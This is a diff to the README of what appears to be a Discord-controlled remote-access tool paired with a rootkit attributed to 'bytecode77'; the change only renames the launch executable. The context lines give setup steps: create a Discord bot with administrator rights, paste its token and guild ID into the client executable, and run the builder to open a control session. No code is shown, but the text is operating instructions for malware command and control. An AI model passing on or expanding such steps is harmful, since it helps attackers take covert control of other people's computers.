@@ -17,7 +17,7 @@ The rootkit in the project was made by "bytecode77". The source of the rootkit c
 You will first need to register a bot with the Discord developer portal and then add the bot to the Discord server that you want to use to control the bot (make sure the bot has administrator privileges in the Discord server).
 Once the bot is created open ```Client-built.exe``` as admin in the build file and paste the token in, and paste the guild ID of where you invited the bot
 
-Then if the steps above were successful, you can launch the file by executing ```builder.exe```. It will create a new channel and post a message on the server with a generated session number.\
+Then if the steps above were successful, you can launch the file by executing ```build.exe```. It will create a new channel and post a message on the server with a generated session number.\
 Now your bot should be available to use ! 
 
 **Requirements:**\
